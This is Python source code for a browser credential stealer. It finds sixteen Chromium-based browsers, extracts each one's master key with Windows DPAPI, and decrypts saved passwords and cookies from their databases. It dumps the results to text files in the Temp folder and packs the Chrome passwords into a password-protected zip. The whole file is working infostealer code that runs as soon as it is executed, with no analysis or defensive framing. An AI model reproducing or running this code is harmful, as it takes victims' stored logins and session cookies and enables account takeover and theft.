import os, requests, json, base64, sqlite3, shutil
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
import pyminizip

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}
def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

total_browsers = 0
def save_results(browser_name, data_type, content):
    global total_browsers
    
    if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
    total_browsers += 1

def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        -- Data --
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        -- Data --
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result
def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        -- Data --

        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        -- Data --

        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result

def mainpass():
    available_browsers = installed_browsers()
    print(available_browsers)
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        #save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        #save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        
    #shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
    pyminizip.compress(user+'\\AppData\\Local\\Temp\\Browser\\google-chrome\\Saved_Passwords.txt', None , user+'\\AppData\\Local\\Temp\\Browser_data.zip', "cGFydGluZyBnaWZ0", 5)
mainpass()

print(user)
print(appdata)